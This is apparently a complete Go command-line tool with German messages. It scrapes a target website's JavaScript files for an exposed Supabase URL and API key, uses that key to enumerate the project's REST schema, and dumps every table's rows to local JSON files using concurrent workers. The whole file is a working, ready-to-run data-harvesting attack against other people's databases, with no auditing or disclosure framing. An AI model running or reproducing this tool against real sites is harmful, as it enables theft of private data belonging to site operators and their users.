package main

import (
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type Config struct {
	Target   string
	OutDir   string
	Workers  int
	Timeout  time.Duration
	PageSize int
}

type SupaCreds struct{ URL, Token string }

var client *http.Client

func parseFlags() (Config, error) {
	target   := flag.String("url", "", "target url")
	outDir   := flag.String("out", "./dump", "output directory")
	workers  := flag.Int("workers", 16, "concurrent workers")
	timeout  := flag.Duration("timeout", 10*time.Second, "http timeout")
	pageSize := flag.Int("page-size", 1000, "rows per request")
	flag.Parse()

	if *target == "" {
		return Config{}, errors.New("--url fehlt")
	}
	p, err := url.ParseRequestURI(*target)
	if err != nil || p.Scheme == "" || p.Host == "" {
		return Config{}, errors.New("--url ungültig")
	}
	if *workers < 1 || *workers > 256 {
		return Config{}, errors.New("--workers muss 1-256 sein")
	}
	if err := os.MkdirAll(*outDir, 0o755); err != nil {
		return Config{}, err
	}
	return Config{strings.TrimRight(*target, "/"), *outDir, *workers, *timeout, *pageSize}, nil
}

func progress(done, total int32) {
	const w = 30
	filled := int(done) * w / int(total)
	fmt.Printf("\r[%s%s] %d/%d", strings.Repeat("=", filled), strings.Repeat(" ", w-filled), done, total)
	if done == total {
		fmt.Println()
	}
}

func get(u string, headers map[string]string) ([]byte, http.Header, error) {
	req, _ := http.NewRequest(http.MethodGet, u, nil)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	res, err := client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer res.Body.Close()
	body, err := io.ReadAll(res.Body)
	return body, res.Header, err
}

func findCreds(text string) (SupaCreds, bool) {
	u := regexp.MustCompile(`https://[a-z0-9-]+\.supabase\.co`).FindString(text)
	t := regexp.MustCompile(`eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`).FindString(text)
	return SupaCreds{u, t}, u != "" && t != ""
}

func supaHeaders(creds SupaCreds, origin string, start, end int) map[string]string {
	return map[string]string{
		"apikey": creds.Token, "authorization": "Bearer " + creds.Token,
		"origin": origin, "referer": origin,
		"Prefer": "count=exact", "Range": fmt.Sprintf("%d-%d", start, end),
	}
}

func parseTotal(cr string) int {
	if i := strings.Index(cr, "/"); i >= 0 {
		if n, err := strconv.Atoi(cr[i+1:]); err == nil {
			return n
		}
	}
	return -1
}

func normalizeURL(base, path string) string {
	if strings.HasPrefix(path, "http") {
		return path
	}
	if strings.HasPrefix(path, "/") {
		return base + path
	}
	return base + "/" + path
}

func scanCreds(target string, jsFiles []string) (SupaCreds, error) {
	type res struct {
		creds SupaCreds
		ok    bool
	}
	ch  := make(chan res, len(jsFiles))
	sem := make(chan struct{}, 32)
	var wg sync.WaitGroup
	var done atomic.Int32
	total := int32(len(jsFiles))

	for _, path := range jsFiles {
		wg.Add(1)
		go func(u string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			body, _, err := get(u, nil)
			progress(done.Add(1), total)
			if err != nil {
				ch <- res{}
				return
			}
			creds, ok := findCreds(string(body))
			ch <- res{creds, ok}
		}(normalizeURL(target, path))
	}
	go func() { wg.Wait(); close(ch) }()

	for r := range ch {
		if r.ok {
			return r.creds, nil
		}
	}
	return SupaCreds{}, errors.New("keine supabase creds gefunden")
}

func fetchAll(target string, creds SupaCreds, path string, pageSize int) ([]json.RawMessage, error) {
	var all []json.RawMessage
	for offset := 0; ; offset += pageSize {
		body, headers, err := get(creds.URL+"/rest/v1"+path, supaHeaders(creds, target, offset, offset+pageSize-1))
		if err != nil {
			return nil, err
		}
		var page []json.RawMessage
		if err := json.Unmarshal(body, &page); err != nil || len(page) == 0 {
			break
		}
		all = append(all, page...)
		total := parseTotal(headers.Get("Content-Range"))
		if (total >= 0 && offset+len(page) >= total) || len(page) < pageSize {
			break
		}
	}
	return all, nil
}

func dumpTable(target string, creds SupaCreds, outDir, path string, pageSize int, done *atomic.Int32, total int32, mu *sync.Mutex) {
	rows, err := fetchAll(target, creds, path, pageSize)
	n := done.Add(1)
	if err != nil || len(rows) == 0 {
		progress(n, total)
		return
	}
	pretty, _ := json.MarshalIndent(rows, "", "  ")
	name := strings.ReplaceAll(strings.TrimPrefix(path, "/"), "/", "_")
	out  := filepath.Join(outDir, "db_"+name+".json")
	os.WriteFile(out, pretty, 0o644)

	mu.Lock()
	fmt.Printf("\r\033[K[+] %-38s %d rows\n", path, len(rows))
	mu.Unlock()
	progress(n, total)
}

func main() {
	cfg, err := parseFlags()
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	client = &http.Client{Timeout: cfg.Timeout}

	html, _, err := get(cfg.Target, nil)
	if err != nil {
		fmt.Println("fetch error:", err)
		return
	}

	jsFiles := regexp.MustCompile(
		`(?:https?://[^\s"'<>]+|/[^\s"'<>]+|\.\.?/[^\s"'<>]+)[^\s"'<>]+\.js`,
	).FindAllString(string(html), -1)
	if len(jsFiles) == 0 {
		fmt.Println("keine js dateien gefunden")
		return
	}

	fmt.Printf("scanne %d js dateien...\n", len(jsFiles))
	creds, err := scanCreds(cfg.Target, jsFiles)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("creds:", creds.URL)

	body, _, err := get(creds.URL+"/rest/v1/", supaHeaders(creds, cfg.Target, 0, cfg.PageSize-1))
	if err != nil {
		fmt.Println("schema error:", err)
		return
	}
	var schema struct {
		Paths map[string]any `json:"paths"`
	}
	if err := json.Unmarshal(body, &schema); err != nil || len(schema.Paths) == 0 {
		fmt.Println("schema parse error")
		return
	}

	paths := make([]string, 0, len(schema.Paths))
	for p := range schema.Paths {
		paths = append(paths, p)
	}

	fmt.Printf("dumping %d tables (%d workers)...\n", len(paths), cfg.Workers)

	jobs := make(chan string, len(paths))
	var wg sync.WaitGroup
	var mu sync.Mutex
	var done atomic.Int32
	total := int32(len(paths))

	for i := 0; i < cfg.Workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for p := range jobs {
				dumpTable(cfg.Target, creds, cfg.OutDir, p, cfg.PageSize, &done, total, &mu)
			}
		}()
	}
	for _, p := range paths {
		jobs <- p
	}
	close(jobs)
	wg.Wait()
	fmt.Println("done")
}